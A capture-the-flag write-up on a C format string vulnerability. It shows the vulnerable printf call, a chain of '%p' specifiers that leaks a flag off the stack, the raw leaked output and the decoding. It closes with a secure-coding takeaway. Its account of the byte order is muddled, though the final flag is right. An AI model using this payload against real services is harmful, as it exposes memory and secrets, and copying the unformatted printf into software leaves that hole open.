# Format String

## Challenge Overview

The challenge provides a **netcat service** and its source code.
The goal is to extract a hidden flag from memory.

---

## Vulnerability

The source code contains a classic **format string vulnerability**:

```c
char flag[200];
fgets(flag, 199, f);   // flag is loaded onto the stack
printf(username);      // ❌ no format string — user input passed directly
```

Normally `printf` is used safely like this:

```c
printf("Hello %s, you are %d years old.", name, age);
```

When `printf` sees `%s` or `%d`, it walks down the **stack** to find the corresponding variables. Since no format string is provided here, passing `%p %p %p ...` as the username tricks `printf` into **blindly reading raw stack memory** and printing it — including the flag that was loaded onto the stack by `fgets`.

---

## Exploitation

### Step 1 — Leak the Stack

We send a long chain of `%p` format specifiers to dump stack values:

```
Username: %p %p %p %p %p %p %p %p %p %p %p %p ...
```

Output:

```
0x7ffeefef5c90 (nil) 0x7fa4256d6887 0x7 0x55c87b700480 0x7ffeefef8048
0x7ffeefef7eb0 0x7fa4257d9600 0x55c87b7002a0 0x6d726f667b4d4854
0x65757373695f7461 0xa7d73 ...
```

### Step 2 — Identify the Flag

Values at positions **10, 11, and 12** look like ASCII-encoded text:

```
[10] 0x6d726f667b4d4854
[11] 0x65757373695f7461
[12] 0xa7d73
```

### Step 3 — Decode

Converting each hex value to ASCII (little-endian, so bytes are reversed):

```
0x6d726f667b4d4854  →  mrof{MHT
0x65757373695f7461  →  eussi_ta
0xa7d73             →  }s
```

Concatenated: `mrof{MHT eussi_ta }s`

Reading in **reverse** (the flag was stored backwards on the stack):

```
THM{format_issue}
```

🏁 Flag retrieved.

---

## Key Takeaway

> **Never pass user input directly to `printf`.** Always use a format string: `printf("%s", input)`. Without it, an attacker can read arbitrary stack memory — including secrets loaded nearby — using format specifiers like `%p`, `%s`, or `%x`.
```
